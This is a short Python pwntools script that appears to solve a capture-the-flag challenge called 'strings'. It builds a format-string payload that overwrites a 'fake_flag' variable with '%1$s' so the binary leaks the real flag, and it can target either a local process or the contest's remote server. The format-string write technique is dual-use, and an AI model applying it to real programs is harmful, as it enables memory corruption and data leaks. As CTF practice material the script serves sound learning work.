#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./strings"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.n00bzunit3d.xyz", 7150)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+88
        b *main2+92
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


fake_flag_addr = elf.symbols["fake_flag"]
log.info("fake_flag: " + hex(fake_flag_addr))

# buffer offset = 6
# overwrite fake_flag to leak flag at stack

writes = {
        fake_flag_addr: '%1',
        fake_flag_addr + 2: '$s',
        }

payload = fmtstr_payload(6, writes)

p.recvuntil("?")
p.sendline(payload)

p.interactive()
